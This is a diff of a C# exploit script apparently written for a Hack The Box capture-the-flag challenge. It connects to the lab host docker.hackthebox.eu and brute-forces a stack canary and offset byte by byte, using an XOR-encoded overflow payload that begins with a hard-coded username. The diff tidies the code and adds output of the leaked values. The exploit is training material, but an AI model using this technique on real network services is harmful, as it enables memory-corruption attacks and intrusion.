@@ -1,8 +1,5 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Net;
 using System.Net.Sockets;
 
@@ -10,10 +7,13 @@ namespace dSocket
 {
     class Program
     {
-        private static Socket ConnectSocket(string Host, int Port)
+        private const string Host = "docker.hackthebox.eu";
+        private const int Port = 45723;
+
+        private static Socket ConnectSocket()
         {
             IPHostEntry ipHostInfo = Dns.GetHostEntry(Host);
-            IPAddress ipAddress = ipHostInfo.AddressList[0];            
+            IPAddress ipAddress = ipHostInfo.AddressList[0];
             // IPAddress ipAddress = IPAddress.Parse(Host); 
             IPEndPoint ipe = new IPEndPoint(ipAddress, Port);
 
@@ -36,7 +36,7 @@ namespace dSocket
             }
             return mySock;
         }
-        private static byte[] xorMe(byte[] inputBuffer)
+        private static byte[] XorMe(byte[] inputBuffer)
         {
             byte[] returnBuffer = new byte[inputBuffer.Length];
             for (int i = 0; i < inputBuffer.Length; i++)
@@ -45,11 +45,11 @@ namespace dSocket
             }
             return returnBuffer;
         }
-        private static byte[] getCanaryAndOffset(byte[] inputBuffer)
-        {            
+        private static byte[] GetCanaryAndOffset(byte[] inputBuffer)
+        {
             byte[] stubXOR;
             int totalFound = 0;
-            byte[] bytes = new byte[1024];            
+            byte[] bytes = new byte[1024];
 
             while (totalFound < 16)
             {
@@ -59,26 +59,30 @@ namespace dSocket
                     // add new byte to array                    
                     stubXOR = new byte[] { (byte)(h ^ 0x0d) };
                     List<byte> list1 = new List<byte>(inputBuffer);
-                    List<byte> list2 = new List<byte>(xorMe(stubXOR));
+                    List<byte> list2 = new List<byte>(XorMe(stubXOR));
                     list1.AddRange(list2);
                     returnBuffer = list1.ToArray();
 
                     // test new byte
-                    Socket testSocket = ConnectSocket("docker.hackthebox.eu", 45661);
+                    Socket testSocket = ConnectSocket();
                     int bytesRec = testSocket.Receive(bytes);
                     testSocket.Send(returnBuffer);
                     bytesRec = 0;
                     Array.Clear(bytes, 0, bytes.Length);
                     bytesRec = testSocket.Receive(bytes);
-                    testSocket.Close();                    
+                    testSocket.Close();
 
                     if (bytesRec > 0)
-                    {                        
-                        inputBuffer = returnBuffer;                        
+                    {
+                        inputBuffer = returnBuffer;
                         totalFound++;
                         if (inputBuffer.Length == 1033)
                         {
-                            Console.Write("[+] Success! Added ");
+                            Console.Write("[+] Success! Canary: ");
+                        }
+                        else if (inputBuffer.Length == 1041)
+                        {
+                            Console.Write("\n[+] Success! Offset: ");
                         }
                         if (inputBuffer.Length > 1032)
                         {
@@ -88,10 +92,29 @@ namespace dSocket
                     }
                 }
             }
-            
+
+            // display canary and offset
+            byte[] offSet = new byte[] { inputBuffer[1047], inputBuffer[1046], inputBuffer[1045], inputBuffer[1044],
+                                            inputBuffer[1043], inputBuffer[1042], inputBuffer[1041], inputBuffer[1040] };
+            byte[] caNary = new byte[] { inputBuffer[1039], inputBuffer[1038], inputBuffer[1037], inputBuffer[1036],
+                                            inputBuffer[1035], inputBuffer[1034], inputBuffer[1033], inputBuffer[1032] };
+            offSet = XorMe(offSet);
+            caNary = XorMe(caNary);
+
+            string canaryStr = "0x";
+            string offsetStr = "0x";
+
+            for (int j = 0; j < 8; j++)
+            {
+                canaryStr += caNary[j].ToString("x2");
+                offsetStr += offSet[j].ToString("x2");
+            }
+
+            Console.WriteLine("\n[-] Offset: {0}\tCanary: {1}", offsetStr, canaryStr);
+
             return inputBuffer;
         }
-        private static byte[] getPayload()
+        private static byte[] GetPayload()
         {
             byte[] bytes = new byte[1024];
             byte[] correctUser = new byte[] { 0x64, 0x61, 0x76, 0x69, 0x64, 0x65, 0x0d, 0x78 };
@@ -104,10 +127,10 @@ namespace dSocket
             Buffer.BlockCopy(correctUser, 0, toReturn, 0, correctUser.Length);
             Buffer.BlockCopy(filler, 0, toReturn, correctUser.Length, filler.Length);
 
-            toReturn = getCanaryAndOffset(toReturn);            
+            toReturn = GetCanaryAndOffset(toReturn);
 
             return toReturn;
-        }        
+        }
         private static void _end(Socket mySocket)
         {
             byte[] bytes = new byte[1024];
@@ -127,14 +150,14 @@ namespace dSocket
             byte[] bytes = new byte[1024];
 
             // get payload
-            byte[] myPayload = getPayload();
+            byte[] myPayload = GetPayload();
             if (myPayload.Length > 0)
             {
-                Console.WriteLine("\n[+] Payload generated");
+                Console.WriteLine("[+] Payload generated");
             }
 
             // connect
-            Socket mySocket = ConnectSocket("docker.hackthebox.eu", 45661);
+            Socket mySocket = ConnectSocket();
             int bytesRec3 = mySocket.Receive(bytes);
             if (bytesRec3 > 0)
             {
